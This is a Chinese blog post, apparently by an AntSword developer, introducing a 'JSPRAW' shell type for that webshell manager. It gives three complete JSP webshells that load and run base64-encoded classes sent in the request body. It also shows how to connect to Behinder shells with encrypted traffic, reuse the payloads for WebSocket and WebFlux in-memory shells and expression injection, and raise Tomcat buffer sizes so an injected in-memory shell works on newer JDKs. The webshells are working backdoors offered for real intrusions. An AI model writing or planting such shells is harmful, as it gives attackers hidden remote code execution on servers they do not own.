# AntSword新增类型：JSPRAW的一些玩法


<meta name="referrer" content="no-referrer" />

## 背景
最近给AntSword新增了一种类型：JSPRAW，主要有以下两点改进：

+ JSPRAW不再使用其他参数进行传参，同时支持key-value键值对以及raw传参形式
+ 新增toString触发方式，Payload可以不用依赖外部request/response对象，兼容非HTTP场景

接下来以几个实际场景讲讲这个新类型有哪些应用。



## 具体应用
### 一键连接冰蝎的JSP Shell
JSPRAW支持如下Shell写法，类似冰蝎，直接发送RAW格式的Payload。需要注意的是这时候设置密码是不生效的，随便填即可，另外需要在设置里勾选 其他设置-Body设置为RAW模式。如果不勾选的话就是键值对传参形式，可以兼容原来的Shell写法。

```plain
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getReader().readLine();
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(new Object[]{request,response});
    }
%>
```

此时传递的Payload形式如下

![](https://cdn.nlark.com/yuque/0/2024/png/1599908/1727009228638-a84ca94f-4955-4136-b4fd-d30d4ab6c45d.png)



既然已经是冰蝎的传参形式了，那么我们只要配合特定的编码器，就可以直接连接冰蝎的Shell了

![](https://cdn.nlark.com/yuque/0/2024/png/1599908/1726568168152-6948bc41-dbb1-4986-a04a-fe069ac6a35d.png)

设置里需要勾选 Body设置为RAW模式

![](https://cdn.nlark.com/yuque/0/2024/png/1599908/1726568240757-72a23998-d5cf-465c-88db-56bc0d1c65ee.png)

正常连接

![](https://cdn.nlark.com/yuque/0/2024/png/1599908/1726568277104-fb203ac4-3f26-40e6-98ac-25580022461b.png)



抓包可以看到，蚁剑也同样实现了冰蝎的强加密能力。一个Shell，两种用法。

![](https://cdn.nlark.com/yuque/0/2024/png/1599908/1726568310699-67defe25-2392-471d-8e4a-79e1f5283796.png)

可以再单独写一个解码器对回显包进行二次编码，这里就不再展开

![](https://cdn.nlark.com/yuque/0/2024/png/1599908/1726568577377-1e31e24d-21bb-4d29-9007-7a7ff8edc807.png)



### 兼容非HTTP场景
在实战中我们会遇到一些非HTTP的情况，例如WebSocket内存马，WebFlux内存马，表达式注入等。因此JSPRAW做了一些改进，以兼容这类利用场景。

在Payload中增加了一个toString的调用入口，可以把执行的回显信息保存到一个字符串里并且return

![](https://cdn.nlark.com/yuque/0/2024/png/1599908/1727010028026-618b550b-1e00-4f74-bacd-76b7dd3283a0.png)



只调用toString的Shell样例如下：

```plain
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getReader().readLine();
    if (cls != null) {
        out.print(new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance());
    }
%>
```



正常连接

![](https://cdn.nlark.com/yuque/0/2024/png/1599908/1726575991891-8159ed07-aaa2-492b-bdcc-71e1c0887364.png)



并且equals跟toString可以同时使用，equals拿到request对象后，还可以同时通过toString获取回显。

这样的写法主要是可以兼容一些漏洞利用场景，不需要每次额外去做判断。不理解的小伙伴多写几个利用EXP就明白我什么意思了。

```plain
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getReader().readLine();
    if (cls != null) {
        Object obj = new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance();
        obj.equals(new Object[]{request,response});
        out.print(obj.toString());
    }
%>
```



正常连接

![](https://cdn.nlark.com/yuque/0/2024/png/1599908/1726575898403-2ec2d7ee-2e87-456f-98a5-14721ed9c4aa.png)



### 高版本JDK下的WebSocket内存马
这里举一个例子：高版本JDK下如何连接WebSocket内存马

背景是蚁剑很早就支持了WebSocket类型的内存马，在JDK<=14的时候可以用Js引擎来实现WebSocket内存马的连接Payload，但是从JDK15开始Js引擎被移除，就无法再使用了。

现在有了JSPRAW之后，WebSocket内存马就不存在高版本JDK的兼容性问题了，可以一直支持到最新的JDK22。

测试的时候还遇到了一个小坑，注入WS内存马以后连接发现只能执行第一个包，后面的包都没有回复。

![](https://cdn.nlark.com/yuque/0/2024/png/1599908/1726998068666-61e52f61-5c46-4731-9182-51088c2aaebc.png)

debug了一番发现原因是Tomcat中WebSocke 发送信息默认长度为8kb，而后续的Payload超过了这个大小。

正常的做法是修改web.xml调大这个参数

```plain
<context-param>
    <param-name>org.apache.tomcat.websocket.textBufferSize</param-name>
    <param-value>5242800</param-value>
</context-param>
```



当然我们不可能去修改web.xml了，代码里找一下在哪里调用的，修改掉就好了

```plain
ServerContainer container = (ServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
container.setDefaultMaxTextMessageBufferSize(52428800); // 设置为50m
container.setDefaultMaxBinaryMessageBufferSize(52428800);
```

这样就可以正常连接了

![](https://cdn.nlark.com/yuque/0/2024/png/1599908/1726998473689-74ef7f3f-4e92-499d-a506-ed397d1b7686.png)



## 最后
代码已经同步到github：[https://github.com/AntSwordProject/AntSword-JSP-Template/tree/jspraw](https://github.com/AntSwordProject/AntSword-JSP-Template/tree/jspraw)

实战是检验真理的唯一标准，你还有什么建议或者新的玩法呢？欢迎一起讨论:)


